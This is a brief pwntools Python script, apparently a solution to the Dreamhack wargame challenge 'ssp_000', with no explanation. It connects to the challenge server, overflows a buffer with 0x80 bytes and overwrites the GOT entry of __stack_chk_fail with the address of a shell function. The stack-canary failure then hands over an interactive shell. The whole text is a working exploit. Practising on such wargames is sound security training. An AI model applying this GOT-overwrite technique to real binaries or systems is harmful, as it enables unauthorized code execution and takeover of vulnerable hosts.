from pwn import *
import time
context.update(log_level='debug')
p = remote('host1.dreamhack.games', 8589)
e = ELF('ssp_000')
addr_got_ssp = e.got['__stack_chk_fail']
addr_shell = 0x4008EA
p.recvrepeat(1)
p.sendline('a'*0x80)
p.recvrepeat(1)
#raw_input('debug: ' + str(p.pid))
p.sendline(str(addr_got_ssp))
p.recvrepeat(1)
p.sendline(str(addr_shell))
p.interactive()
